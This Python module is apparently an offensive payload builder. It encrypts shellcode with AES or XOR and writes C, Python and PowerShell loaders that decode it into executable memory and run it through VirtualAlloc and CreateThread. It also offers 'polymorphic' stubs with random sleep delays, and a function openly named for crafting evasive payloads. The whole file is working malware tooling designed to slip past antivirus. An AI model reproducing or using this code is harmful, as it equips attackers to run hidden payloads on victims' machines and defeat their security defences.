import os
import uuid
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

OUTPUT_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "generated_payloads")


def _ensure_dir():
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)


def encrypt_shellcode_aes(raw_shellcode, key=None):
    if isinstance(raw_shellcode, str):
        raw_shellcode = bytes.fromhex(raw_shellcode.replace("\\x", "").replace("0x", "").replace(" ", ""))

    if not key:
        key = os.urandom(32)

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    pad_len = 16 - (len(raw_shellcode) % 16)
    padded = raw_shellcode + bytes([pad_len] * pad_len)
    encrypted = encryptor.update(padded) + encryptor.finalize()

    return {
        "encrypted": encrypted,
        "key": key,
        "iv": iv,
        "original_size": len(raw_shellcode),
        "encrypted_size": len(encrypted)
    }


def generate_c_loader(encrypted_sc, key, iv, output_name=None):
    sc_hex = ", ".join(f"0x{b:02x}" for b in encrypted_sc)
    key_hex = ", ".join(f"0x{b:02x}" for b in key)
    iv_hex = ", ".join(f"0x{b:02x}" for b in iv)

    c_code = f'''#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

unsigned char shellcode[] = {{ {sc_hex} }};
unsigned char aes_key[] = {{ {key_hex} }};
unsigned char aes_iv[] = {{ {iv_hex} }};
SIZE_T sc_len = sizeof(shellcode);

BOOL DecryptAES(unsigned char *data, SIZE_T len, unsigned char *key, unsigned char *iv) {{
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;
    DWORD dwLen = (DWORD)len;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return FALSE;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {{ CryptReleaseContext(hProv, 0); return FALSE; }}
    if (!CryptHashData(hHash, key, 32, 0)) {{ CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return FALSE; }}
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {{ CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return FALSE; }}
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {{ CryptDestroyKey(hKey); CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return FALSE; }}
    if (!CryptDecrypt(hKey, 0, TRUE, 0, data, &dwLen)) {{ CryptDestroyKey(hKey); CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return FALSE; }}
    CryptDestroyKey(hKey); CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0);
    return TRUE;
}}

int main() {{
    if (!DecryptAES(shellcode, sc_len, aes_key, aes_iv)) return 1;
    void *exec = VirtualAlloc(0, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) return 1;
    RtlMoveMemory(exec, shellcode, sc_len);
    ((void(*)())exec)();
    return 0;
}}
'''

    if not output_name:
        output_name = f"loader_{uuid.uuid4().hex[:6]}.c"

    filepath = os.path.join(OUTPUT_DIR, output_name)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(c_code)

    return {
        "status": "success",
        "filename": output_name,
        "filepath": filepath,
        "language": "c",
        "original_size": len(encrypted_sc),
        "encrypted": True
    }


def generate_python_loader(encrypted_sc, key, iv, output_name=None):
    key_b64 = base64.b64encode(key).decode()
    iv_b64 = base64.b64encode(iv).decode()
    sc_b64 = base64.b64encode(encrypted_sc).decode()

    py_code = f'''import base64, ctypes, os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

key = base64.b64decode("{key_b64}")
iv = base64.b64decode("{iv_b64}")
sc = base64.b64decode("{sc_b64}")

cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
decryptor = cipher.decryptor()
shellcode = decryptor.update(sc) + decryptor.finalize()

buf = ctypes.create_string_buffer(shellcode, len(shellcode))
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, len(shellcode))
ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_void_p(ptr), 0, 0, 0)
'''

    if not output_name:
        output_name = f"loader_{uuid.uuid4().hex[:6]}.py"

    filepath = os.path.join(OUTPUT_DIR, output_name)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(py_code)

    return {
        "status": "success",
        "filename": output_name,
        "filepath": filepath,
        "language": "python",
        "original_size": len(encrypted_sc),
        "encrypted": True
    }


def generate_powershell_loader(encrypted_sc, key, iv, output_name=None):
    sc_b64 = base64.b64encode(encrypted_sc).decode()
    key_b64 = base64.b64encode(key).decode()
    iv_b64 = base64.b64encode(iv).decode()

    ps_code = f'''$sc = [System.Convert]::FromBase64String("{sc_b64}")
$key = [System.Convert]::FromBase64String("{key_b64}")
$iv = [System.Convert]::FromBase64String("{iv_b64}")

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$dec = $aes.CreateDecryptor()
$shellcode = $dec.TransformFinalBlock($sc, 0, $sc.Length)

$k = Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr t);[DllImport("kernel32")]public static extern void RtlMoveMemory(IntPtr d, byte[] s, uint l);' -Name "K" -PassThru
$p = $k::VirtualAlloc(0, $shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $p, $shellcode.Length)
$k::CreateThread(0, 0, $p, 0, 0, 0) | Out-Null
'''

    if not output_name:
        output_name = f"loader_{uuid.uuid4().hex[:6]}.ps1"

    filepath = os.path.join(OUTPUT_DIR, output_name)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(ps_code)

    return {
        "status": "success",
        "filename": output_name,
        "filepath": filepath,
        "language": "powershell",
        "original_size": len(encrypted_sc),
        "encrypted": True
    }


def generate_xor_encoder(raw_shellcode, xor_key=None):
    if isinstance(raw_shellcode, str):
        raw_shellcode = bytes.fromhex(raw_shellcode.replace("\\x", "").replace("0x", "").replace(" ", ""))

    if not xor_key:
        xor_key = os.urandom(1)[0]
    if xor_key == 0:
        xor_key = 0x55

    encoded = bytes(b ^ xor_key for b in raw_shellcode)

    decoder_c = f'''unsigned char shellcode[] = {{ {', '.join(f'0x{b:02x}' for b in encoded)} }};
unsigned int len = {len(encoded)};
unsigned char key = 0x{xor_key:02x};
for (unsigned int i = 0; i < len; i++) shellcode[i] ^= key;
void *exec = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
RtlMoveMemory(exec, shellcode, len);
((void(*)())exec)();
'''

    decoder_py = f'''import ctypes
sc = bytes([{', '.join(f'0x{b:02x}' for b in encoded)}])
key = 0x{xor_key:02x}
decoded = bytes(b ^ key for b in sc)
buf = ctypes.create_string_buffer(decoded, len(decoded))
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
p = ctypes.windll.kernel32.VirtualAlloc(0, len(decoded), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(p), buf, len(decoded))
ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_void_p(p), 0, 0, 0)
'''

    return {
        "status": "success",
        "xor_key": xor_key,
        "encoded_size": len(encoded),
        "original_size": len(raw_shellcode),
        "c_decoder": decoder_c,
        "python_decoder": decoder_py,
        "entropy_level": "low" if xor_key < 32 else "medium"
    }


def generate_polymorphic_stub(language="python", layers=3):
    stubs = {
        "python": '''import ctypes, base64, zlib, random, time
time.sleep(random.uniform(0.1, 1.5))
LAYER1 = base64.b64decode("{}")
LAYER2 = zlib.decompress(LAYER1)
LAYER3 = bytes(b ^ 0x{rand_key:02x} for b in LAYER2)
buf = ctypes.create_string_buffer(LAYER3, len(LAYER3))
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
p = ctypes.windll.kernel32.VirtualAlloc(0, len(LAYER3), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(p), buf, len(LAYER3))
ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_void_p(p), 0, 0, 0)
''',
        "csharp": '''using System;
using System.Threading;
using System.Runtime.InteropServices;
class Program {{
    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr t);
    [DllImport("kernel32")] static extern void RtlMoveMemory(IntPtr d, byte[] s, uint l);
    static void Main() {{
        Thread.Sleep(new Random().Next(100, 1500));
        byte[] b64 = Convert.FromBase64String("{b64_sc}");
        byte[] comp = Decompress(b64);
        byte[] sc = new byte[comp.Length];
        for (int i = 0; i < comp.Length; i++) sc[i] = (byte)(comp[i] ^ {rand_key});
        IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, p, sc.Length);
        CreateThread(IntPtr.Zero, 0, p, IntPtr.Zero, 0, IntPtr.Zero);
        Thread.Sleep(999999);
    }}
    static byte[] Decompress(byte[] data) {{
        using (var ms = new System.IO.MemoryStream(data))
        using (var ds = new System.IO.Compression.DeflateStream(ms, System.IO.Compression.CompressionMode.Decompress))
        using (var outMs = new System.IO.MemoryStream()) {{ ds.CopyTo(outMs); return outMs.ToArray(); }}
    }}
}}'''
    }

    return {
        "status": "success",
        "stub_templates": stubs,
        "layers": layers,
        "description": f"Polymorphic {layers}-layer stub. Embed your encrypted shellcode."
    }


def craft_evasive_payload(raw_shellcode, language="python", method="aes"):
    _ensure_dir()
    if isinstance(raw_shellcode, str):
        raw_shellcode = bytes.fromhex(raw_shellcode.replace("\\x", "").replace("0x", "").replace(" ", ""))

    result = {
        "status": "success",
        "method": method,
        "language": language,
    }

    if method == "aes":
        enc = encrypt_shellcode_aes(raw_shellcode)
        result["encryption"] = {
            "algorithm": "AES-256-CBC",
            "key_hex": enc["key"].hex(),
            "iv_hex": enc["iv"].hex(),
            "encrypted_hex": enc["encrypted"].hex(),
            "original_size": enc["original_size"],
            "encrypted_size": enc["encrypted_size"]
        }
        if language == "python":
            loader = generate_python_loader(enc["encrypted"], enc["key"], enc["iv"])
        elif language == "powershell":
            loader = generate_powershell_loader(enc["encrypted"], enc["key"], enc["iv"])
        else:
            loader = generate_c_loader(enc["encrypted"], enc["key"], enc["iv"])
        result["loader"] = loader

    elif method == "xor":
        enc = generate_xor_encoder(raw_shellcode)
        result["encryption"] = enc
        result["loader"] = {"status": "success", "c_decoder": enc["c_decoder"], "python_decoder": enc["python_decoder"]}

    elif method == "polymorphic":
        stub = generate_polymorphic_stub(language)
        result["polymorphic"] = stub

    return result
